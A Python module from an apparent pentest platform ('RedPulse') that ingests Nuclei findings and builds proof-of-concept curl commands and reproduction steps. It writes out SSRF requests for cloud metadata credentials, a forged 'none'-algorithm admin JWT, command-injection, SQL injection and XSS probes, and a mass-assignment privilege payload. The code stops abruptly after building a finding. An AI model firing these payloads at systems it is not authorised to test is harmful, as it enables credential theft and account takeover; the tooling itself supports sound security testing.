"""RedPulse - Finding Ingestion Service.

Ingests Nuclei scan results into the Finding model with fingerprint-based
deduplication. Maps each finding to the correct Asset and Project.

Phase 5 enhancements:
  - Triage tags for critical/high findings (access control, IDOR, auth bypass, etc.)
  - Auto-generated PoC curl commands and reproduction steps
  - Sensitive object-ID parameter detection
  - Enhanced categorization for business logic & access control flaws
  - Prioritization of Critical and High severity findings

Phase 8 enhancements:
  - Advanced high-impact vulnerability detection: RCE, SSRF cloud metadata,
    JWT attacks, race conditions, mass assignment, business logic bypass
  - Specialized PoC generators per vulnerability type (SSRF metadata curl,
    JWT exploitation, race condition parallel requests, mass assignment)
  - Enhanced fingerprinting for advanced vuln categories

Flow:
  Nuclei raw output -> parse -> generate fingerprint -> classify triage tags
  -> build specialized PoC -> upsert Finding -> link Asset
"""

import hashlib
import logging
from datetime import datetime, timezone
from typing import Optional, List
from urllib.parse import urlparse, parse_qs, urlencode

from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from app.db.models import (
    Finding, FindingSeverity, FindingStatus, FindingCategory, TriageTag,
    Asset, VulnerabilityScan, VulnScanStatus, ReconTool, AssetType,
)

logger = logging.getLogger("redpulse.finding_ingester")

# Object-ID parameter names that indicate potential IDOR / access-control vectors
_IDOR_PARAM_NAMES = {
    "user_id", "account_id", "uid", "id", "doc_id", "document_id",
    "file_id", "order_id", "invoice_id", "profile_id", "patient_id",
    "customer_id", "member_id", "record_id", "item_id", "product_id",
    "group_id", "org_id", "tenant_id", "company_id", "project_id",
    "ticket_id", "message_id", "post_id", "comment_id", "attachment_id",
    "resource_id", "object_id", "target_id", "ref", "key", "token",
    "session", "sid", "cid", "oid",
}

# Template-ID keywords that indicate access control / auth bypass issues
_ACCESS_CONTROL_KEYWORDS = {
    "idor": TriageTag.INSECURE_DIRECT_OBJECT,
    "access-control": TriageTag.BROKEN_ACCESS_CONTROL,
    "privilege": TriageTag.PRIVILEGE_ESCALATION,
    "auth-bypass": TriageTag.AUTH_BYPASS,
    "authentication": TriageTag.AUTH_BYPASS,
    "unauth": TriageTag.AUTH_BYPASS,
    "missing-auth": TriageTag.AUTH_BYPASS,
    "no-auth": TriageTag.AUTH_BYPASS,
    "cors": TriageTag.CORS_MISCONFIG,
    "csrf": TriageTag.CSRF,
    "session": TriageTag.SESSION_HIJACKING,
    "cookie": TriageTag.COOKIE_SECURITY,
    "redirect": TriageTag.OPEN_REDIRECT,
    "secret": TriageTag.SENSITIVE_SECRET,
    "api-key": TriageTag.SENSITIVE_SECRET,
    "token-exposure": TriageTag.SENSITIVE_SECRET,
    "jwt": TriageTag.SENSITIVE_SECRET,
    "hardcoded": TriageTag.SENSITIVE_SECRET,
    "javascript": TriageTag.JAVASCRIPT_SECRETS,
    "js-secret": TriageTag.JAVASCRIPT_SECRETS,
    "env-exposure": TriageTag.JAVASCRIPT_SECRETS,
    # Phase 8: Advanced high-impact keywords
    "rce": TriageTag.REMOTE_CODE_EXECUTION,
    "remote-code": TriageTag.REMOTE_CODE_EXECUTION,
    "command-injection": TriageTag.REMOTE_CODE_EXECUTION,
    "os-command": TriageTag.REMOTE_CODE_EXECUTION,
    "code-injection": TriageTag.REMOTE_CODE_EXECUTION,
    "ssrf": TriageTag.SSRF_CLOUD_METADATA,
    "cloud-metadata": TriageTag.SSRF_CLOUD_METADATA,
    "aws-metadata": TriageTag.SSRF_CLOUD_METADATA,
    "gcp-metadata": TriageTag.SSRF_CLOUD_METADATA,
    "azure-metadata": TriageTag.SSRF_CLOUD_METADATA,
    "imds": TriageTag.SSRF_CLOUD_METADATA,
    "jwt-none": TriageTag.JWT_ATTACK,
    "jwt-algorithm": TriageTag.JWT_ATTACK,
    "jwt-confusion": TriageTag.JWT_ATTACK,
    "jwt-signing": TriageTag.JWT_ATTACK,
    "jwt-secret": TriageTag.JWT_ATTACK,
    "race-condition": TriageTag.RACE_CONDITION,
    "race": TriageTag.RACE_CONDITION,
    "concurrent": TriageTag.RACE_CONDITION,
    "mass-assignment": TriageTag.MASS_ACCOUNT_TAKEOVER,
    "property-injection": TriageTag.MASS_ACCOUNT_TAKEOVER,
    "over-posting": TriageTag.MASS_ACCOUNT_TAKEOVER,
    "business-logic-bypass": TriageTag.BUSINESS_LOGIC_BYPASS,
    "logic-bypass": TriageTag.BUSINESS_LOGIC_BYPASS,
    "negative-amount": TriageTag.BUSINESS_LOGIC_BYPASS,
    "price-manipulation": TriageTag.BUSINESS_LOGIC_BYPASS,
}

# Template-ID keywords that map to FindingCategory
# More specific keywords must come before less specific ones (dict order matters)
_CATEGORY_KEYWORDS = {
    "idor": FindingCategory.IDOR,
    "access-control": FindingCategory.ACCESS_CONTROL,
    "auth-bypass": FindingCategory.AUTH_BYPASS,
    "authentication": FindingCategory.AUTH_BYPASS,
    "unauth": FindingCategory.AUTH_BYPASS,
    "sensitive": FindingCategory.SENSITIVE_DATA,
    "secret": FindingCategory.SENSITIVE_DATA,
    "xss": FindingCategory.XSS,
    "cross-site": FindingCategory.XSS,
    "sqli": FindingCategory.SQLI,
    "sql-injection": FindingCategory.SQLI,
    "ssrf": FindingCategory.SSRF,
    "cloud-metadata": FindingCategory.SSRF_CLOUD_METADATA,
    "aws-metadata": FindingCategory.SSRF_CLOUD_METADATA,
    "gcp-metadata": FindingCategory.SSRF_CLOUD_METADATA,
    "azure-metadata": FindingCategory.SSRF_CLOUD_METADATA,
    "imds": FindingCategory.SSRF_CLOUD_METADATA,
    "remote-code": FindingCategory.RCE,
    "command-injection": FindingCategory.RCE,
    "os-command": FindingCategory.RCE,
    "code-injection": FindingCategory.RCE,
    "rce": FindingCategory.RCE,
    "jwt-none": FindingCategory.JWT_VULNERABILITY,
    "jwt-algorithm": FindingCategory.JWT_VULNERABILITY,
    "jwt-confusion": FindingCategory.JWT_VULNERABILITY,
    "jwt-secret": FindingCategory.JWT_VULNERABILITY,
    "jwt": FindingCategory.JWT_VULNERABILITY,
    "business-logic-bypass": FindingCategory.BUSINESS_LOGIC_BYPASS,
    "logic-bypass": FindingCategory.BUSINESS_LOGIC_BYPASS,
    "negative-amount": FindingCategory.BUSINESS_LOGIC_BYPASS,
    "price-manipulation": FindingCategory.BUSINESS_LOGIC_BYPASS,
    "business-logic": FindingCategory.BUSINESS_LOGIC,
    "race-condition": FindingCategory.RACE_CONDITION,
    "concurrent": FindingCategory.RACE_CONDITION,
    "race": FindingCategory.RACE_CONDITION,
    "mass-assignment": FindingCategory.MASS_ASSIGNMENT,
    "property-injection": FindingCategory.MASS_ASSIGNMENT,
    "over-posting": FindingCategory.MASS_ASSIGNMENT,
    "lfi": FindingCategory.FILE_INCLUSION,
    "rfi": FindingCategory.FILE_INCLUSION,
    "file-inclusion": FindingCategory.FILE_INCLUSION,
    "cors": FindingCategory.MISCONFIGURATION,
    "takeover": FindingCategory.TAKEOVER_INDICATORS,
    "exposure": FindingCategory.EXPOSURE,
    "exposed": FindingCategory.EXPOSURE,
    "leak": FindingCategory.EXPOSURE,
    "misconfig": FindingCategory.MISCONFIGURATION,
    "default": FindingCategory.MISCONFIGURATION,
    "weak": FindingCategory.MISCONFIGURATION,
    "cve": FindingCategory.KNOWN_VULNERABILITIES,
    "vu": FindingCategory.KNOWN_VULNERABILITIES,
}


def _severity_from_nuclei(severity_str: str) -> FindingSeverity:
    """Convert Nuclei severity string to FindingSeverity enum."""
    mapping = {
        "critical": FindingSeverity.CRITICAL,
        "high": FindingSeverity.HIGH,
        "medium": FindingSeverity.MEDIUM,
        "low": FindingSeverity.LOW,
        "info": FindingSeverity.INFO,
    }
    return mapping.get(severity_str.lower(), FindingSeverity.INFO)


def _category_from_template(template_id: str) -> str:
    """Infer finding category from Nuclei template ID."""
    tid = template_id.lower()
    # Check ordered by specificity
    for keyword, category in _CATEGORY_KEYWORDS.items():
        if keyword in tid:
            return category.value
    return FindingCategory.TECHNOLOGY_SPECIFIC.value


def _infer_triage_tags(
    template_id: str,
    severity: FindingSeverity,
    matched_at: str,
    raw_finding: dict,
) -> List[str]:
    """Infer triage tags based on template ID, severity, and matched URL.

    Tags help triage teams quickly identify high-impact findings like
    IDOR, broken access control, auth bypass, and sensitive data exposure.
    """
    tid = template_id.lower()
    tags: List[str] = []

    # Always tag critical/high severity
    if severity in (FindingSeverity.CRITICAL, FindingSeverity.HIGH):
        tags.append(TriageTag.CRITICAL_RISK.value)

    # Template-based classification
    for keyword, tag in _ACCESS_CONTROL_KEYWORDS.items():
        if keyword in tid:
            tags.append(tag.value)

    # Check matched-at URL for IDOR-like parameters
    idor_params = _extract_idor_params(matched_at)
    if idor_params:
        tags.append(TriageTag.INSECURE_DIRECT_OBJECT.value)
        tags.append(TriageTag.BROKEN_ACCESS_CONTROL.value)

    # Deduplicate and return
    return sorted(set(tags))


def _extract_idor_params(matched_at: str) -> List[str]:
    """Extract object-ID parameter names from the matched-at URL.

    Scans both path segments and query parameters for names that indicate
    potential IDOR / access-control vectors.
    """
    if not matched_at:
        return []

    found = set()
    try:
        parsed = urlparse(matched_at)
        qs = parse_qs(parsed.query)
        for key in qs:
            if key.lower() in _IDOR_PARAM_NAMES:
                found.add(key)
    except Exception:
        pass

    # Also scan path segments for patterns like /users/123 or /docs/{id}
    path_parts = matched_at.split("/")
    for part in path_parts:
        lower = part.lower()
        for param in _IDOR_PARAM_NAMES:
            if param in lower:
                found.add(param)

    return sorted(found)


def generate_fingerprint(
    engagement_id: str,
    template_id: str,
    matched_at: str,
    host: str,
) -> str:
    """Generate a stable fingerprint for finding deduplication.

    Based on: engagement + template + matched endpoint + host.
    Returns first 64 chars of SHA-256 hex digest.
    """
    key = f"{engagement_id}|{template_id}|{matched_at}|{host}"
    return hashlib.sha256(key.encode()).hexdigest()[:64]


def _generate_poc_curl(
    host: str,
    matched_at: str,
    severity: FindingSeverity,
    template_id: str,
    auth_headers: Optional[dict] = None,
    category: str = "",
) -> str:
    """Auto-generate a PoC curl command for reproduction.

    Phase 8: Dispatches to specialized PoC generators for advanced vulns:
    - RCE: Safe detection payloads (id, sleep)
    - SSRF cloud metadata: Metadata endpoint fetch
    - JWT: Algorithm confusion, none-algorithm, weak secret
    - Race condition: Parallel request script
    - Mass assignment: Privileged field injection
    - Default: Standard curl with auth headers
    """
    # Phase 8: Route to specialized generators based on category
    cat_lower = category.lower() if category else ""
    tid_lower = template_id.lower() if template_id else ""

    if cat_lower in ("rce",) or "rce" in tid_lower or "command-injection" in tid_lower or "os-command" in tid_lower:
        return _generate_poc_curl_rce(host, matched_at, template_id, auth_headers)

    if cat_lower in ("ssrf_cloud_metadata",) or "cloud-metadata" in tid_lower or "imds" in tid_lower or "aws-metadata" in tid_lower or "gcp-metadata" in tid_lower or "azure-metadata" in tid_lower:
        return _generate_poc_curl_ssrf_metadata(host, matched_at, template_id, auth_headers)

    if cat_lower in ("jwt_vulnerability",) or "jwt" in tid_lower:
        return _generate_poc_curl_jwt(host, matched_at, template_id, auth_headers)

    if cat_lower in ("race_condition",) or "race" in tid_lower or "concurrent" in tid_lower:
        return _generate_poc_curl_race_condition(host, matched_at, template_id, auth_headers)

    if cat_lower in ("mass_assignment",) or "mass-assignment" in tid_lower or "over-posting" in tid_lower or "property-injection" in tid_lower:
        return _generate_poc_curl_mass_assignment(host, matched_at, template_id, auth_headers)

    # Default: standard PoC curl
    # Determine target URL
    if matched_at and matched_at.startswith("http"):
        target_url = matched_at
    elif matched_at:
        target_url = f"https://{host}{matched_at}" if matched_at.startswith("/") else f"https://{host}/{matched_at}"
    else:
        target_url = f"https://{host}"

    parts = ["curl", "-v", "-k"]

    # Add auth headers for authenticated scan findings
    if auth_headers:
        for key, value in auth_headers.items():
            parts.append(f'-H "{key}: {value}"')

    # Add common security-testing headers
    parts.append('-H "User-Agent: RedPulse-PoC/1.0"')
    parts.append('-H "Accept: */*"')

    # For severity-critical/high, add verbose output flags
    if severity in (FindingSeverity.CRITICAL, FindingSeverity.HIGH):
        parts.append("-w '\\nHTTP_CODE:%{http_code}\\nSIZE:%{size_download}\\n'")

    parts.append(f'"{target_url}"')

    return " \\\n  ".join(parts)


# --- Phase 8: Specialized PoC Generators ---


def _generate_poc_curl_ssrf_metadata(
    host: str,
    matched_at: str,
    template_id: str,
    auth_headers: Optional[dict] = None,
) -> str:
    """Generate a specialized PoC curl for SSRF cloud metadata attacks.

    Produces curl commands targeting cloud provider metadata endpoints:
    - AWS: http://169.254.169.254/latest/meta-data/
    - GCP: http://metadata.google.internal/computeMetadata/v1/
    - Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
    """
    if matched_at and matched_at.startswith("http"):
        target_url = matched_at
    elif matched_at:
        target_url = f"https://{host}{matched_at}" if matched_at.startswith("/") else f"https://{host}/{matched_at}"
    else:
        target_url = f"https://{host}"

    parts = ["curl", "-v", "-k"]

    if auth_headers:
        for key, value in auth_headers.items():
            parts.append(f'-H "{key}: {value}"')

    parts.append('-H "User-Agent: RedPulse-SSRF-PoC/1.0"')
    parts.append('-H "Accept: */*"')

    # SSRF payload to fetch cloud metadata
    ssrf_payload = (
        f"-d 'url=http://169.254.169.254/latest/meta-data/' "
        f"-d 'callback=http://169.254.169.254/latest/meta-data/' "
        f"-d 'metadata=http://169.254.169.254/latest/meta-data/'"
    )
    parts.append(ssrf_payload)

    parts.append("-w '\\nHTTP_CODE:%{http_code}\\nSIZE:%{size_download}\\n'")
    parts.append(f'"{target_url}"')

    return " \\\n  ".join(parts)


def _generate_poc_curl_jwt(
    host: str,
    matched_at: str,
    template_id: str,
    auth_headers: Optional[dict] = None,
) -> str:
    """Generate a specialized PoC curl for JWT vulnerabilities.

    Covers: none-algorithm bypass, weak secret brute-force,
    algorithm confusion (RS256->HS256), key injection.
    """
    if matched_at and matched_at.startswith("http"):
        target_url = matched_at
    elif matched_at:
        target_url = f"https://{host}{matched_at}" if matched_at.startswith("/") else f"https://{host}/{matched_at}"
    else:
        target_url = f"https://{host}"

    tid = template_id.lower()
    parts = ["curl", "-v", "-k"]

    if auth_headers:
        for key, value in auth_headers.items():
            parts.append(f'-H "{key}: {value}"')

    # Craft JWT based on vulnerability type
    if "none" in tid or "algorithm" in tid:
        # JWT none-algorithm bypass
        fake_jwt = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."
        parts.append(f'-H "Authorization: Bearer {fake_jwt}"')
    elif "secret" in tid:
        # Weak JWT secret - use common test secrets
        parts.append('-H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0In0.test"')
    elif "confusion" in tid:
        # Algorithm confusion - RS256 -> HS256
        parts.append('-H "Authorization: Bearer <forge_with_public_key_as_secret>"')
    else:
        parts.append('-H "Authorization: Bearer <forge_jwt_with_modified_claims>"')

    parts.append('-H "Content-Type: application/json"')
    parts.append('-H "Accept: application/json"')
    parts.append("-w '\\nHTTP_CODE:%{http_code}\\nSIZE:%{size_download}\\n'")
    parts.append(f'"{target_url}"')

    return " \\\n  ".join(parts)


def _generate_poc_curl_race_condition(
    host: str,
    matched_at: str,
    template_id: str,
    auth_headers: Optional[dict] = None,
) -> str:
    """Generate a PoC for race condition testing.

    Produces parallel curl commands using GNU parallel or background processes.
    """
    if matched_at and matched_at.startswith("http"):
        target_url = matched_at
    elif matched_at:
        target_url = f"https://{host}{matched_at}" if matched_at.startswith("/") else f"https://{host}/{matched_at}"
    else:
        target_url = f"https://{host}"

    auth_flag = ""
    if auth_headers:
        for key, value in auth_headers.items():
            auth_flag += f' -H "{key}: {value}"'

    # Generate parallel request script
    poc = f"""# Race Condition PoC - Send 10 parallel requests
# Use: bash race_condition_poc.sh
for i in $(seq 1 10); do
  curl -s -o /dev/null -w "Request $i: HTTP {{http_code}}\\n" \\
    -k {auth_flag} \\
    -H "User-Agent: RedPulse-Race-PoC/1.0" \\
    "{target_url}" &
done
wait
echo "All requests completed. Check for inconsistent state."""

    return poc


def _generate_poc_curl_mass_assignment(
    host: str,
    matched_at: str,
    template_id: str,
    auth_headers: Optional[dict] = None,
) -> str:
    """Generate a PoC curl for mass assignment / over-posting attacks.

    Demonstrates injecting privileged fields (role, is_admin, price, balance)
    into a normal API request.
    """
    if matched_at and matched_at.startswith("http"):
        target_url = matched_at
    elif matched_at:
        target_url = f"https://{host}{matched_at}" if matched_at.startswith("/") else f"https://{host}/{matched_at}"
    else:
        target_url = f"https://{host}"

    parts = ["curl", "-v", "-k"]

    if auth_headers:
        for key, value in auth_headers.items():
            parts.append(f'-H "{key}: {value}"')

    parts.append('-H "Content-Type: application/json"')
    parts.append('-H "Accept: application/json"')
    parts.append('-H "User-Agent: RedPulse-PoC/1.0"')

    # Mass assignment payload with privileged fields
    mass_payload = (
        '{'
        '"name":"test_user",'
        '"email":"test@example.com",'
        '"role":"admin",'
        '"is_admin":true,'
        '"price":0,'
        '"balance":999999,'
        '"discount_percent":100'
        '}'
    )
    parts.append(f"-d '{mass_payload}'")
    parts.append("-w '\\nHTTP_CODE:%{http_code}\\nSIZE:%{size_download}\\n'")
    parts.append(f'"{target_url}"')

    return " \\\n  ".join(parts)


def _generate_poc_curl_rce(
    host: str,
    matched_at: str,
    template_id: str,
    auth_headers: Optional[dict] = None,
) -> str:
    """Generate a PoC curl for RCE / command injection.

    Uses safe detection payloads (sleep, ping) to confirm without exploitation.
    """
    if matched_at and matched_at.startswith("http"):
        target_url = matched_at
    elif matched_at:
        target_url = f"https://{host}{matched_at}" if matched_at.startswith("/") else f"https://{host}/{matched_at}"
    else:
        target_url = f"https://{host}"

    parts = ["curl", "-v", "-k"]

    if auth_headers:
        for key, value in auth_headers.items():
            parts.append(f'-H "{key}: {value}"')

    parts.append('-H "User-Agent: RedPulse-RCE-PoC/1.0"')
    parts.append('-H "Accept: */*"')

    # Safe RCE detection payloads (no destructive commands)
    tid = template_id.lower()
    if "os-command" in tid or "command-injection" in tid:
        parts.append("-d 'input=id'")
        parts.append("-d 'cmd=id'")
        parts.append("-d 'command=id'")
    elif "code-injection" in tid:
        parts.append("-d 'input=__import__(\"os\").popen(\"id\").read()'")
        parts.append("-d 'template={{range(0,1)}}{{end}}'")
    else:
        parts.append("-d 'input=;id'")
        parts.append("-d 'cmd=|id'")

    parts.append("-w '\\nHTTP_CODE:%{http_code}\\nSIZE:%{size_download}\\n'")
    parts.append(f'"{target_url}"')

    return " \\\n  ".join(parts)


def _generate_poc_steps_specialized(
    title: str,
    template_id: str,
    severity: FindingSeverity,
    matched_at: str,
    host: str,
    category: str,
    description: str,
    sensitive_params: List[str],
) -> str:
    """Generate specialized reproduction steps for advanced high-impact vulns.

    Phase 8: Covers RCE, SSRF cloud metadata, JWT attacks, race conditions,
    mass assignment, and business logic bypass.
    """
    steps = []

    steps.append(f"## PoC: {title}")
    steps.append(f"**Severity:** {severity.value.upper()}")
    steps.append(f"**Category:** {category}")
    steps.append(f"**Template:** {template_id}")
    steps.append("")
    steps.append("### Reproduction Steps")

    tid = template_id.lower()

    if category in ("rce",) or "rce" in tid or "command-injection" in tid:
        steps.append(f"1. Identify the injection point at: `{matched_at or host}`")
        steps.append("2. Inject a safe detection payload: `;id` or `|id` or `` `id` ``")
        steps.append("3. Observe the command output in the HTTP response")
        steps.append("4. Verify by injecting: `;sleep 5` and observing a 5-second delay")
        steps.append("5. **Impact:** Full server compromise — read files, reverse shell, pivot")
        steps.append("")
        steps.append("### Safe Detection Payloads")
        steps.append("- Linux: `;id`, `|id`, `` `id` ``")
        steps.append("- Windows: `&whoami`, `|whoami`")

    elif category in ("ssrf_cloud_metadata",) or "cloud-metadata" in tid or "imds" in tid:
        steps.append(f"1. Identify the SSRF injection point at: `{matched_at or host}`")
        steps.append("2. Craft a request to the cloud metadata endpoint:")
        steps.append("   - AWS: `http://169.254.169.254/latest/meta-data/`")
        steps.append("   - GCP: `http://metadata.google.internal/computeMetadata/v1/`")
        steps.append("   - Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`")
        steps.append("3. Observe metadata response containing instance credentials")
        steps.append("4. Fetch IAM credentials: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`")
        steps.append("5. **Impact:** Cloud account takeover, lateral movement, data exfiltration")
        steps.append("")
        steps.append("### Metadata Endpoints")
        steps.append("- Instance ID: `/latest/meta-data/instance-id`")
        steps.append("- IAM Role: `/latest/meta-data/iam/security-credentials/`")
        steps.append("- User Data: `/latest/user-data`")

    elif category in ("jwt_vulnerability",) or "jwt" in tid:
        steps.append(f"1. Intercept a JWT token from: `{matched_at or host}`")
        steps.append("2. Decode the JWT header and payload (e.g., at jwt.io)")
        if "none" in tid or "algorithm" in tid:
            steps.append("3. **None-algorithm attack:** Change `alg` from `RS256` to `none`")
            steps.append("4. Remove the signature portion of the JWT")
            steps.append("5. Send the forged token — server accepts it without verification")
        elif "confusion" in tid:
            steps.append("3. **Algorithm confusion:** Obtain the server's RSA public key")
            steps.append("4. Sign the JWT with HS256 using the public key as the HMAC secret")
            steps.append("5. The server verifies with the public key, matching the HMAC")
        elif "secret" in tid:
            steps.append("3. **Weak secret:** Try common secrets: `secret`, `password`, `key123`")
            steps.append("4. Use jwt_tool or hashcat to brute-force the HMAC secret")
            steps.append("5. Forge arbitrary claims once the secret is recovered")
        else:
            steps.append("3. Modify the JWT claims (e.g., set `role: admin`)")
            steps.append("4. Re-sign with the appropriate algorithm")
            steps.append("5. Send the modified token and observe privilege escalation")
        steps.append("6. **Impact:** Authentication bypass, privilege escalation, account takeover")

    elif category in ("race_condition",) or "race" in tid:
        steps.append(f"1. Identify the state-changing endpoint: `{matched_at or host}`")
        steps.append("2. Capture the request in Burp Suite or similar proxy")
        steps.append("3. Send 10-20 parallel requests using Turbo Intruder or parallel curl")
        steps.append("4. Observe for inconsistent state (e.g., double-spending, duplicate credits)")
        steps.append("5. Check database state after the burst — resources may be over-allocated")
        steps.append("6. **Impact:** Financial loss, duplicate resource allocation, data corruption")
        steps.append("")
        steps.append("### Parallel Request Script")
        steps.append("```bash")
        steps.append("for i in $(seq 1 10); do")
        steps.append('  curl -s -o /dev/null -w "Request $i: HTTP {http_code}\\n" &')
        steps.append("done")
        steps.append("wait")
        steps.append("```")

    elif category in ("mass_assignment",) or "mass-assignment" in tid or "over-posting" in tid:
        steps.append(f"1. Identify the update endpoint: `{matched_at or host}`")
        steps.append("2. Intercept a normal PUT/PATCH request")
        steps.append("3. Add privileged fields to the JSON body:")
        steps.append('   ```json')
        steps.append('   {')
        steps.append('     "name": "normal_user",')
        steps.append('     "role": "admin",')
        steps.append('     "is_admin": true,')
        steps.append('     "price": 0,')
        steps.append('     "balance": 999999')
        steps.append('   }')
        steps.append('   ```')
        steps.append("4. Send the modified request")
        steps.append("5. Verify the privileged fields were accepted and persisted")
        steps.append("6. **Impact:** Privilege escalation, financial manipulation, data corruption")

    elif category in ("business_logic_bypass",) or "business-logic-bypass" in tid or "logic-bypass" in tid:
        steps.append(f"1. Identify the business logic flow at: `{matched_at or host}`")
        steps.append("2. Analyze the multi-step process (e.g., checkout, registration)")
        steps.append("3. Attempt to skip steps by directly accessing later endpoints")
        steps.append("4. Try negative values, zero amounts, or boundary conditions")
        steps.append("5. Manipulate sequence: submit step 3 before step 1")
        steps.append("6. **Impact:** Free products, bypassed payments, unauthorized access")

    else:
        # Fallback for unknown advanced categories
        steps.append(f"1. Access the vulnerable endpoint: `{matched_at or host}`")
        steps.append("2. Follow the attack vector described in the finding description")
        steps.append("3. Verify the vulnerability is exploitable")

    if description:
        steps.append("")
        steps.append("### Description")
        steps.append(description[:500])

    return "\n".join(steps)


def _generate_poc_steps(
    title: str,
    template_id: str,
    severity: FindingSeverity,
    matched_at: str,
    host: str,
    category: str,
    description: str,
    sensitive_params: List[str],
) -> str:
    """Generate human-readable reproduction steps for high-severity findings.

    Produces structured, step-by-step instructions suitable for manual
    verification by a security reviewer.
    """
    steps = []

    steps.append(f"## PoC: {title}")
    steps.append(f"**Severity:** {severity.value.upper()}")
    steps.append(f"**Category:** {category}")
    steps.append(f"**Template:** {template_id}")
    steps.append("")

    steps.append("### Reproduction Steps")

    if category in ("idor", "access_control", "auth_bypass"):
        steps.append("1. Authenticate as User A and note the target URL/parameters")
        steps.append("2. Extract the object identifiers from the request (see flagged parameters below)")
        if sensitive_params:
            steps.append(f"3. Flagged sensitive parameters: `{', '.join(sensitive_params)}`")
            steps.append("4. Replace the parameter values with identifiers belonging to User B")
            steps.append("5. Observe that the application returns User B's data without authorization checks")
        else:
            steps.append("3. Modify object-ID parameters to reference resources belonging to another user")
            steps.append("4. Verify the application does not enforce ownership verification")
    elif category == "xss":
        steps.append(f"1. Navigate to the vulnerable endpoint: `{matched_at or host}`")
        steps.append("2. Inject a benign probe payload: `<script>alert(document.domain)</script>`")
        steps.append("3. Observe the payload is reflected without sanitization")
    elif category == "sqli":
        steps.append(f"1. Send a request to: `{matched_at or host}`")
        steps.append("2. Append a time-based blind payload: `' OR SLEEP(5)--`")
        steps.append("3. Observe a delay in the response confirming injection")
    elif category == "sensitive_data":
        steps.append(f"1. Access the endpoint: `{matched_at or host}`")
        steps.append("2. Review the response body for exposed secrets, tokens, or credentials")
        steps.append("3. Document the sensitive data found")
    else:
        steps.append(f"1. Access the vulnerable endpoint: `{matched_at or host}`")
        steps.append("2. Follow the attack vector described in the finding description")
        steps.append("3. Verify the vulnerability is exploitable")

    if description:
        steps.append("")
        steps.append("### Description")
        steps.append(description[:500])

    return "\n".join(steps)


async def ingest_nuclei_finding(
    db: AsyncSession,
    engagement_id: str,
    project_id: str,
    user_id: str,
    scan_id: Optional[str],
    raw_finding: dict,
    asset_id: Optional[str] = None,
    auth_headers: Optional[dict] = None,
) -> Finding:
    """Ingest a single Nuclei finding into the Finding table.

    Handles deduplication via fingerprint: if a finding with the same fingerprint
    exists, updates last_seen instead of creating a duplicate.

    Phase 5: For Critical/High severity findings, automatically generates
    triage tags, PoC curl commands, and reproduction steps.

    Args:
        db: AsyncSession
        engagement_id: The engagement UUID
        project_id: The project UUID
        user_id: The user UUID
        scan_id: The VulnerabilityScan UUID (optional)
        raw_finding: Nuclei finding dict with keys:
            template_id, severity, host, matched-at, status-code, etc.
        asset_id: Pre-resolved Asset UUID (optional, will try to resolve if not provided)
        auth_headers: Auth headers used for the scan (for PoC generation)

    Returns:
        The Finding record (new or updated)
    """
    host = raw_finding.get("host", "")
    template_id = raw_finding.get("template_id", "unknown")
    matched_at = raw_finding.get("matched-at", raw_finding.get("matched_at", ""))
    severity_str = raw_finding.get("severity", "info")

    # Resolve asset_id if not provided
    if not asset_id and host:
        asset_result = await db.execute(
            select(Asset).where(
                Asset.engagement_id == engagement_id,
                Asset.value == host,
            )
        )
        asset = asset_result.scalar_one_or_none()
        if asset:
            asset_id = asset.id

    # Generate fingerprint
    fingerprint = generate_fingerprint(engagement_id, template_id, matched_at, host)

    # Check for existing finding with same fingerprint
    result = await db.execute(
        select(Finding).where(
            Finding.engagement_id == engagement_id,
            Finding.fingerprint == fingerprint,
        )
    )
    existing = result.scalar_one_or_none()
    now = datetime.now(timezone.utc)

    if existing:
        existing.last_seen = now
        existing.updated_at = now
        # If previously resolved, reopen it (regression)
        if existing.status == FindingStatus.RESOLVED:
            existing.status = FindingStatus.REOPENED
            logger.info(f"Finding {existing.id} reopened (regression detected)")
        await db.flush()
        return existing

    # Create new finding
    severity = _severity_from_nuclei(severity_str)
    category = _category_from_template(template_id)

    # Phase 5: Infer triage tags
    triage_tags = _infer_triage_tags(template_id, severity, matched_at, raw_finding)

    # Phase 5: Extract sensitive parameters (IDOR vectors)
    sensitive_params = _extract_idor_params(matched_at)

    # Phase 5+8: Generate PoC for high-severity findings
    poc_curl = None
    poc_steps = None
    if severity in (FindingSeverity.CRITICAL, FindingSeverity.HIGH):
        poc_curl = _generate_poc_curl(
            host, matched_at, severity, template_id, auth_headers, category
        )
        title = raw_finding.get("info", {}).get("name", template_id) if isinstance(raw_finding.get("info"), dict) else template_id
        description = _build_description(raw_finding)

        # Phase 8: Use specialized steps for advanced vuln categories
        _advanced_categories = {
            "rce", "ssrf_cloud_metadata", "jwt_vulnerability",
            "race_condition", "mass_assignment", "business_logic_bypass",
        }
        if category in _advanced_categories:
            poc_steps = _generate_poc_steps_specialized(
                title=title or template_id,
                template_id=template_id,
                severity=severity,
                matched_at=matched_at,
                host=host,
                category=category,
                description=description,
                sensitive_params=sensitive_params,
            )
        else:
            poc_steps = _generate_poc_steps(
                title=title or template_id,
                template_id=template_id,
                severity=severity,
                matched_at=matched_at,
                host=host,
                category=category,
                description=description,
                sensitive_params=sensitive_params,
            )

    # Build title from template
    title = raw_finding.get("info", {}).get("name", template_id) if isinstance(raw_finding.get("info"), dict) else template_id
    if not title or title == "unknown":
        title = f"Nuclei finding: {template_id}"

    finding = Finding(
        engagement_id=engagement_id,
        project_id=project_id,
        asset_id=asset_id,
        scan_id=scan_id,
        user_id=user_id,
        title=title[:500],
        template_id=template_id[:200] if template_id else None,
        severity=severity,
        confidence=_confidence_from_severity(severity),
        category=category,
        description=_build_description(raw_finding),
        evidence=raw_finding.get("raw_output", raw_finding.get("matcher-name", "")),
        endpoint=matched_at[:500] if matched_at else None,
        matched_at=matched_at[:500] if matched_at else None,
        impact=_infer_impact(severity, category),
        remediation=raw_finding.get("info", {}).get("remediation", None) if isinstance(raw_finding.get("info"), dict) else None,
        # Phase 5 fields
        triage_tags=triage_tags if triage_tags else None,
        poc_curl=poc_curl,
        poc_steps=poc_steps,
        sensitive_params=sensitive_params if sensitive_params else None,
        # Dedup & lifecycle
        fingerprint=fingerprint,
        status=FindingStatus.NEW,
        first_seen=now,
        last_seen=now,
        raw_output=raw_finding.get("raw_output", "")[:10000] if raw_finding.get("raw_output") else None,
    )

